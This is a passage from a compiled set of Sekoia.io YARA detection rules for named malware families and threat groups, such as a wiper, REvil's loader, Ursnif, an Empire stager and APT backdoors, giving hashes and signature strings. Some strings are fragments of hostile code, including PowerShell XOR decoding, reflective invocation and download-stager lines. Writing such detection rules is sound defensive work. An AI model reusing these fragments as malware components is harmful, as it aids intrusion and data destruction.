		date = "2023-02-15"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/implant_win_apt29_2022_10.yar#L4-L20"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "b9300c2f06b54b16e1cab579d686d986caacf3b6eccec3a4e62d58e94b50bfb4"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "1cffaf3be725d1514c87c328ca578d5df1a86ea3b488e9586f9db89d992da5c4"
		hash2 = "381a3c6c7e119f58dfde6f03a9890353a20badfa1bfa7c38ede62c6b0692103c"

	condition:
		pe.imphash( ) == "39b818e7bac0a276f509f8c47e467666" or for any i in ( 0 .. pe.number_of_sections -1 ) : ( hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "6621113d9f212c71b8dd3ce85c62b251" )
}

rule SEKOIA_Downloader_Mac_Rustbucket_Swiftloader
{
	meta:
		description = "Detect the file com.EdoneViewer in the new version of RustBucker 2023-10"
		author = "Sekoia.io"
		id = "bdbc95db-5d58-4c96-91f9-34b653e67f50"
		date = "2023-12-05"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/downloader_mac_rustbucket_swiftloader.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "acb5b88f8af53cd3d83de0fd6c3049ce017f038dc7c8b31f70e65e60bf713dfb"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "7c5bf60787bfd076c8806eaa4f1185f5b9fda69008376624ab3d17f207eb16a4"
		hash2 = "bc90adde92bd47b4de7d384e5b20c1a1791d603629bd0fcba4b550fb35e93216"
		hash3 = "c9a7b42c7b29ca948160f95f017e9e9ae781f3b981ecf6edbac943e52c63ffc8"

	strings:
		$ = "/Users/ghost/Desktop/EdoneViewer/EdoneViewer/"
		$ = "EdoneViewerApp.swift"

	condition:
		1 of them
}

rule SEKOIA_Wiper_Win_Isaacwiper
{
	meta:
		description = "Detect the IsaacWiper using multiple methods + ReversingLab rule's condition"
		author = "Sekoia.io"
		id = "b081e3a3-612e-46ae-93af-82e7ee98fcf7"
		date = "2022-03-15"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/wiper_win_isaacwiper.yar#L4-L45"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "0338e11ece112b6f7d88db49cfc703a4431d7ee54f4b9ff0b9e2ea50d39cab4f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "getting drives..." wide
		$s2 = "physical drives:" wide
		$s3 = "-- system physical drive" wide
		$s4 = "-- physical drive" wide
		$s5 = "logical drives:" wide
		$s6 = "-- system logical drive:" wide
		$s7 = "-- logical drive:" wide
		$s8 = "start erasing physical drives..." wide
		$s9 = "-- FAILED" wide
		$s10 = "-- start erasing logical drive" wide
		$s11 = "start erasing system physical drive..." wide
		$s12 = "system physical drive -- FAILED" wide
		$s13 = "start erasing system logical drive" wide

	condition:
		pe.imphash( ) == "a4b162717c197e11b76a4d9bc58ea25d" or for any i in ( 0 .. pe.number_of_sections -1 ) : ( hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "06d63fddf89fae3948764028712c36d6" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "48f101db632bb445c21a10fd5501e343" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "5efc98798d0979e69e2a667fc20e3f24" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "9676f7c827fb9388358aaba3e4bd0cc6" ) or hash.md5 ( pe.rich_signature.clear_data ) == "ec862d3013903478c2ff8dce2792815f" or all of ( $s* )
}

rule SEKOIA_Apt_Mustangpanda_Maliciousdll_Loading_Plugx_Strings
{
	meta:
		description = "Detects MustangPanda malicious DLL"
		author = "Sekoia.io"
		id = "2296ac6e-63f5-4cff-aeb7-2c5205e6f559"
		date = "2023-12-18"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_mustangpanda_maliciousdll_loading_plugx_strings.yar#L3-L23"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		hash = "651c096cf7043a01d939dff9ba58e4d69f15b2244c71b43bedb4ada8c37e8859"
		logic_hash = "667901d36585248a891b90ff8ed7006030151fbbbe0d4a85570944a94edba7f8"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "VirtualAlloc"
		$ = "VirtualFree"
		$ = "VirtualProtect"
		$ = "VirtualQuery"
		$ = "GCC: (MinGW-W64"

	condition:
		pe.exports( "MsiProvideQualifiedComponentW" ) and all of them
}

rule SEKOIA_Tool_Xiebroc2_Strings
{
	meta:
		description = "Detects XiebroC2 based on strings"
		author = "Sekoia.io"
		id = "8451878e-5371-440b-b8ac-f9e6f7643d3c"
		date = "2024-09-11"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/tool_xiebroc2_strings.yar#L1-L40"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		hash = "84e665bcbf963a2cf67d879aa3422d79"
		hash = "3558c376420724694ba244a2e2acd20c"
		hash = "e29fb9cd825db51a7a2e519f188e61ba"
		hash = "a3b31739ad5eed51277c8478a83160a3"
		hash = "d6e2499ea7fe8f047da1a95dae16d2c3"
		hash = "1616818b65bf49d985bb1816461a4a75"
		hash = "2e72d3ef2492088a4623d77d5e419ab8"
		hash = "351770f860507d652ec3644ed1988f7f"
		hash = "58fa6ad96028753ba8b0b0ed8fa6dccb"
		hash = "607b541525b27eeefbef1455397bff35"
		hash = "c2a242612468814e2e951e4db3762059"
		hash = "431e275f4e43ec4ef7c2cc8ba126e9d3"
		hash = "ace54bd32c226a7b9a6d4d53791e4021"
		hash = "f22c21ed7bba1ddfc42ffdc66da3a4dd"
		hash = "9a5ff9e07ed04cb0e71102cf1aae380c"
		hash = "d20e01a1af3f40a7a9646d7e7df1b42e"
		hash = "5544b621c9772cd32c4db77a0e59515a"
		logic_hash = "f3be31e0f1ad8e8bce132d861de5068340653547d786378f9b8045382f40939f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "RemarkClientColor"
		$s2 = "HandlePacket"
		$s3 = "-hide"
		$s4 = "Failed to send data:"
		$s5 = "Pac_ket"
		$s6 = "WANip"
		$s7 = "%s %s && Kernel: %s"
		$g1 = "go.buildid"
		$g2 = "dep    golang.org"

	condition:
		3 of ( $s* ) and any of ( $g* )
}

rule SEKOIA_Koi_Powershell_Loading_Obfuscatednet
{
	meta:
		description = "Powershell script loading obfuscated .NET Koi module"
		author = "Sekoia.io"
		id = "75a7460d-cc28-470e-9841-da8e46ee0101"
		date = "2024-03-20"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/koi_powershell_loading_obfuscatednet.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "82f30c04474ea77af5169771a2c0e75ba792fd32dc559b8c29172b73ace4ef10"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "# [Net.ServicePointManager]::SecurityProtocol +='tls12'"
		$s2 = "$binary[$i] = $binary[$i] -bxor $k[$i % $k.Length]"
		$s3 = "\").Split('|')"
		$s4 = "$ep.Invoke($null, "

	condition:
		$s3 and 3 of them
}

rule SEKOIA_Backdoor_Win_Winordll64
{
	meta:
		description = "Detect the WinorDLL64 backdoor"
		author = "Sekoia.io"
		id = "86a32538-bc69-47ea-9842-4af360588c27"
		date = "2023-02-24"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/backdoor_win_winordll64.yar#L4-L23"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "30e6f01f30d6ef11c75e133d309cebc87b69ede8eb38aa14d237760e99b52c54"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	condition:
		hash.md5( pe.rich_signature.clear_data ) == "d16713cbfe04151b3a9e832c8afd55df" or for any i in ( 0 .. pe.number_of_sections -1 ) : ( hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "3f638774c2565594029fb52ceb67db7a" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "f9416bfb43b2c70837927e43e7591a2a" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "6eede2cebaef39eec5bd1c24c809e3dc" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "1177658fb0469cd5982102c9f3cd2eea" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "658d877d1bf0d2928b2c3efec9ec06cf" ) or pe.imphash ( ) == "d6b6f8cdffb06f469e06c7af9639897c"
}

rule SEKOIA_Loader_Win_Ninerat
{
	meta:
		description = "Detect the NineRAT instrumentator"
		author = "Sekoia.io"
		id = "b9aa3ddc-7892-402f-b045-182884ee9bad"
		date = "2023-12-12"
		modified = "2024-12-19"
		reference = "https://blog.talosintelligence.com/lazarus_new_rats_dlang_and_telegram/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/loader_win_ninerat.yar#L4-L37"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "eab81277a2ffe926c2d9f990ee2e36f0e5f27a14d3048c50d31952d90ce7ab0b"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "ba8cd92cc059232203bcadee260ddbae273fc4c89b18424974955607476982c4"
		hash2 = "5b02fc3cfb5d74c09cab724b5b54c53a7c07e5766bffe5b1adf782c9e86a8541"

	strings:
		$ = "TelegramRat\\lastest\\Dropper"
		$ = "\\Release\\ServiceMid.pdb"

	condition:
		all of them or pe.imphash ( ) == "104a3dc970a385f64de39e0dad61a9a2" or hash.md5 ( pe.rich_signature.clear_data ) == "aab0aa6b89d883e42be8b65a4e41a139" or for any i in ( 0 .. pe.number_of_sections -1 ) : ( hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "827d5fd4b1a0426037529ee9bba48da0" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "82354f92508dcb33acda01c226de2975" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "ccd0f5d837a6cc05a861f040cbdfe080" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "8d2c169356afe8b53b0ecb83de3084b9" )
}

rule SEKOIA_Rat_Win_Reverserat
{
	meta:
		description = "Detect SideCopy's ReverseRAT v3 observed in January 2023"
		author = "Sekoia.io"
		id = "8fbd395f-f44e-46d5-a942-7c7e88f37127"
		date = "2023-02-22"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/rat_win_reverserat.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		hash = "b277a824b2671f40298ce03586a2ccc0fca2a081a66230c57a3060c2028f13ee"
		hash = "8b87459483248d7b95424cd52b7d4f3031e89c6644adc2e167556e071d9ec3aa"
		logic_hash = "13a5a916e084996ce4d7840581250f7630652acdcad0f66e21763cb3a9cbccc3"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "SELECT maxclockspeed,  datawidth, name, manufacturer FROM Win32_Processor" wide
		$ = "select * from Win32_PhysicalMemory" wide
		$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" wide

	condition:
		all of them
}

rule SEKOIA_Water_Sigbin_Group
{
	meta:
		description = "Detects IOCs related to the 8220 Mining group."
		author = "Sekoia.io"
		id = "c49728e8-db7e-4d83-97d2-7d56b51f8a52"
		date = "2024-06-11"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/water_sigbin_group.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "dd51945bf79e37b50d377eda3641eb32438dcb5a1c55fb4a9b66a5b5a8b5ed0d"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "Z12A3" ascii fullword
		$s2 = "FromBase64String" ascii fullword
		$s3 = "Start-Process" ascii fullword
		$s4 = "WriteAllBytes" ascii fullword

	condition:
		all of them
}

rule SEKOIA_Apt_Apt37_Chinotto_Powershell_Variant
{
	meta:
		description = "Detects APT37 Chinotto Powershell Variant"
		author = "Sekoia.io"
		id = "fa42b225-58fe-4e00-b84b-df37491d8fdd"
		date = "2023-03-06"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_apt37_chinotto_powershell_variant.yar#L1-L20"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "b4d17467f15d52bd615e335fa8bc31381ec273b67dabb74655f47179f04f631f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "$env:COMPUTERNAME + '-' + $env:USERNAME;" ascii wide
		$ = "while($true -eq $true)" ascii wide
		$ = "Start-Sleep -Seconds" ascii wide
		$ = " -ne 'null' -and $" ascii wide
		$ = "= 'R=' + [System.Convert]::" ascii wide
		$ = "[string]$([char]0x0D) + [string]$([char]0x0A);" ascii wide

	condition:
		4 of them
}

rule SEKOIA_Dropper_Win_Selfau3
{
	meta:
		description = "Finds SelfAU3 Dropper samples based on specific strings"
		author = "Sekoia.io"
		id = "2d005a54-b013-40e9-b88a-30454e4b22af"
		date = "2024-02-12"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/dropper_win_selfau3.yar#L1-L24"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "5f69457127ae6cb84b04f72dd30393dbcf32b4ba26ec6d529eebcc03191cbed3"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$sfx = "!Require Windows" ascii
		$ins01 = ";!@Install@!UTF-8!" ascii
		$set = {53 65 74 45 6e 76 69 72 6f 6e 6d 65 6e 74 3d 22 [1-15] 3d ?? 22}
		$run = "RunProgram=\"hidcon:c" ascii
		$ins02 = ";!@InstallEnd@!" ascii

	condition:
		$sfx at 77 and $set in ( @ins01 .. @ins01 + 500 ) and #set > 5 and $run in ( @set .. @set + 1000 ) and $ins02 in ( @run .. @run + 500 )
}

rule SEKOIA_Ransomware_Win_Raworld
{
	meta:
		description = "Detects files related to stage 1 of a campaign from the ransomware group RA World."
		author = "Sekoia.io"
		id = "a9ed9c5a-7a0e-4c2e-90f4-d52f5589b2b8"
		date = "2024-07-24"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/ransomware_win_raworld.yar#L1-L23"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "583dd2ea8e20a87d0b67783d1dd59212eb133de1f945d5b4afad89e8a5017d35"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "Loder.exe" ascii fullword
		$s2 = "Stage2.exe" wide
		$s3 = "SYSVOL" wide
		$s4 = "Finish.exe" wide
		$s5 = "Exclude.exe" wide
		$s6 = "Stage3.exe" wide
		$s7 = "Pay.txt" ascii fullword
		$s8 = "RA World" ascii fullword
		$s9 = "Stage1.exe" ascii fullword

	condition:
		4 of them
}

rule SEKOIA_Ursnif_Ldr4
{
	meta:
		description = "Ursnif LDR4"
		author = "Sekoia.io"
		id = "73e63481-8a89-4342-87f0-8dc7ad459396"
		date = "2024-12-19"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/ursnif_ldr4.yar#L1-L26"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "6fe237c6370a1b99bddb7bee4170d29cbb780dc445f5d5039201ddbaf05c63db"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$str1 = "LOADER.dll" fullword
		$str2 = "DllRegisterServer" fullword
		$str3 = ".bss" fullword
		$x64_code1 = { 3D 2E 62 73 73 74 0A 48 83 C7 28 }
		$x64_code2 = { 8B 17 48 83 C7 04 8B CA 8b C2 23 CB 0B C3 F7 D1 23 C8 41 2B CA 44 8B D2 41 89 08 41 8B CB 49 83 C0 04 83 E1 07 FF C1 41 D3 C2 41 83 EB 04 79 }
		$x64_code3 = { 41 0F B6 01 49 FF C1 8B C8 8B D0 83 E1 03 C1 E1 03 D3 E2 44 03 C2 41 83 C2 FF 75 }
		$x64_code4 = { 45 8D 45 08 48 8D 8C 24 [4] BA 30 00 FE 7F E8 }
		$x64_code5 = { 48 8D 8C 24 [4] BA 30 00 FE 7F 41 B8 08 00 00 00 E8 }
		$x86_code1 = { 81 F9 2E 62 73 73 74 09 83 C6 28 }
		$x86_code2 = { 8B 06 8B D0 23 55 0C 8B D8 0B 5D 0C F7 D2 23 D3 2B D1 8A 4D 08 80 E1 07 83 C6 04 89 17 83 C7 04 FE C1 D3 C0 83 6D 08 04 8B C8 79 }
		$x86_code3 = { 8A 0E 0F B6 D1 8B CA 83 E1 03 C1 E1 03 D3 E2 46 03 C2 4F 75 }
		$x86_code4 = { 6A 08 8D 45 F8 68 30 00 FE 7F 50 E8 }

	condition:
		true and 5 of them
}

rule SEKOIA_Apt_Badmagic_Modules
{
	meta:
		description = "Detect the modules used by the CloudWizard framework"
		author = "Sekoia.io"
		id = "e4f1f706-4a46-4a09-b598-e4e8d80f2c4b"
		date = "2023-05-25"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_badmagic_modules.yar#L3-L20"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		hash = "no hash has been found on 2023-05-25 to test the rule"
		logic_hash = "6f8bc35dbf0fd4083a8d93b04b55b2e0e215cd23350243ddd7ba9dd4745c4496"
		score = 50
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	condition:
		pe.DLL and pe.exports ( "Start" ) and pe.exports ( "Stop" ) and pe.exports ( "Whoami" ) and pe.exports ( "GetResult" ) and pe.exports ( "GetSettings" )
}

rule SEKOIA_Gen_Empire_Onedrive_Stager
{
	meta:
		description = "Detects the Empire OneDrive stager"
		author = "Sekoia.io"
		id = "2053416f-1f53-491e-9c70-787a04362d16"
		date = "2022-01-26"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/gen_empire_onedrive_stager.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "90b3548cd3f4f7f936da70ec95dbe0ff3c1421d40a6e8557952d28d358b7c1f1"
		score = 75
		quality = 76
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$sleep = "Start-Sleep -Seconds $(($PI -as [Int])*2)" wide ascii nocase
		$down = "wc.DownloadData" wide ascii nocase

	condition:
		$down in ( @sleep .. @sleep + 1000 )
}

rule SEKOIA_Crime_Sload_Scheduledtask_Dropper_Strings
{
	meta:
		description = "No description has been set in the source file - SEKOIA"
		author = "Sekoia.io"
		id = "01c51da8-71a5-449f-a609-933c37bc2e63"
		date = "2022-08-02"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/crime_sload_scheduledtask_dropper_strings.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "3a48009933d1de47314ec15c262375636574a7565016eab3792106fa2c0ba79f"
		score = 75
		quality = 78
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "$hh='hi'+'dd'+'en';"
		$ = { 7D 65 6C 73 65 7B 0A 24 72 73 3D 30 3B 0A 7D 0A }
		$ = { 6B 69 6C 6C 20 2D 6E 61 6D 65 20 2A 77 65 72 73 68 65 6C 2A }

	condition:
		all of them
}

rule SEKOIA_Apt_Menupass_Maliciouslibvlc_Dll
{
	meta:
		description = "Detects the malicious LibVLC variants used by MenuPass"
		author = "Sekoia.io"
		id = "8b6b56f3-33b5-41cf-8bcb-e653c98718bd"
		date = "2022-04-06"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_menupass_maliciouslibvlc_dll.yar#L3-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "de56e112a477d3a77146f1b84c8aa3e66a382a87f1492dd50aa1de9458b33717"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	condition:
		pe.DLL and pe.number_of_exports < 15 and for all i in ( 0 .. pe.number_of_exports - 1 ) : ( pe.export_details [ i ] . name contains "libvlc_" )
}

rule SEKOIA_Downloader_Win_Fake_Tor_Browser
{
	meta:
		description = "Detect fake TOR browser used to spy Chinese TOR users"
		author = "Sekoia.io"
		id = "6b070ba6-490b-43c2-9a01-65812d829eeb"
		date = "2022-10-05"
		modified = "2024-12-19"
		reference = "https://securelist.com/onionpoison-infected-tor-browser-installer-youtube/107627/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/downloader_win_fake_tor_browser.yar#L4-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "5fe60673e54a6904f4fd068b04b950b895b18e7766d2e7343eae2b1bba9591f9"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	condition:
		for any i in ( 0 .. pe.number_of_sections -1 ) : ( hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "7172f95f934574be95c0250fb42b8f51" )
}

rule SEKOIA_Loader_Win_Revil_Loader
{
	meta:
		description = "Detect the REvil loader using DDL side loading. The detected ressource is a legitimate executable used to load the malicious .dll containing the ransomware"
		author = "Sekoia.io"
		id = "3c293e87-e2d7-475a-9536-8b991961fa11"
		date = "2021-07-19"
		modified = "2024-12-19"
		reference = "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/revil-ransomware-uses-dll-sideloading"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/loader_win_revil_loader.yar#L4-L34"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "15680c5e5d801d65e581869ad88d89863c8a51e3f94a3d2f37c02c5fd14df07f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "1fe9b489c25bb23b04d9996e8107671edee69bd6f6def2fe7ece38a0fb35f98e"
		hash2 = "50416e50797cf88a48d086e718c003e2d10c3847b1a251669d6f10f8d3546e03"
		hash3 = "66490c59cb9630b53fa3fa7125b5c9511afde38edab4459065938c1974229ca8"
		hash4 = "81d0c71f8b282076cd93fb6bb5bfd3932422d033109e2c92572fc49e4abc2471"
		hash5 = "aae6e388e774180bc3eb96dad5d5bfefd63d0eb7124d68b6991701936801f1c7"
		hash6 = "d55f983c994caa160ec63a59f6b4250fe67fb3e8c43a388aec60a4a6978e9f1e"
		hash7 = "dc6b0e8c1e9c113f0364e1c8370060dee3fcbe25b667ddeca7623a95cd21411f"
		hash8 = "df2d6ef0450660aaae62c429610b964949812df2da1c57646fc29aa51c3f031e"

	strings:
		$crypto = ".\\crypto\\" ascii
		$dropped_name1 = "MsMpEng.exe" wide
		$dropped_name2 = "mpsvc.dll" ascii

	condition:
		all of ( $dropped_name* ) and #crypto > 100 and for any i in ( 0 .. pe.number_of_resources -1 ) : ( hash.sha256 ( pe.resources [ i ] . offset , pe.resources [ i ] . length ) == "33bc14d231a4afaa18f06513766d5f69d8b88f1e697cd127d24fb4b72ad44c7a" )
}

rule SEKOIA_Backdoor_Win_Nukesped_Andariel
{
	meta:
		description = "Detect the NukeSped variant type 1 used by Andariel in October 2023"
		author = "Sekoia.io"
		id = "a3601f0b-5782-4546-ac22-8a0514791f8f"
		date = "2023-11-27"
		modified = "2024-12-19"
		reference = "https://asec.ahnlab.com/en/59073/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/backdoor_win_nukesped_andariel.yar#L4-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "d6421f3d0a3059e4104cfdceebb237269592f8ace7cc8d5bd613d239e4c010f4"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	condition:
		for any i in ( 0 .. pe.number_of_resources -1 ) : ( hash.sha256 ( pe.resources [ i ] . offset , pe.resources [ i ] . length ) == "4ce43c7e358e3951f4c4ebd050d570786cbb473ee353974fc7414e3d753da9f6" or hash.sha256 ( pe.resources [ i ] . offset , pe.resources [ i ] . length ) == "355485cbe2bec406d60a48d7d8d25c71d9ded3c508c87273d936a92b94720d9b" )
}

rule SEKOIA_Apt_Muddywater_Powershell_Reverse_Secure_Proxy
{
	meta:
		description = "Detects PowerShell Reverse Secure Proxy"
		author = "Sekoia.io"
		id = "b255f327-cb56-41b7-82f7-83ee23f791a5"
		date = "2023-11-14"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_muddywater_powershell_reverse_secure_proxy.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "6507bc030d60af5559492bbb02bc619646306ab06c9bd9d3f78ae6ce55307bda"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "$CS.Read($buff,4,2) | Out-Null" ascii wide
		$ = "$DP = $buff[2]*256 + $buff[3]" ascii wide
		$ = "$PS3.BeginInvoke() | Out-Null" ascii wide

	condition:
		all of them
}

rule SEKOIA_Rat_Win_Romcom_Payload
{
	meta:
		description = "Detect the RomCom malware"
		author = "Sekoia.io"
		id = "c391f84c-f0cb-42d8-a8d8-d59725bf74c2"
		date = "2022-11-04"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
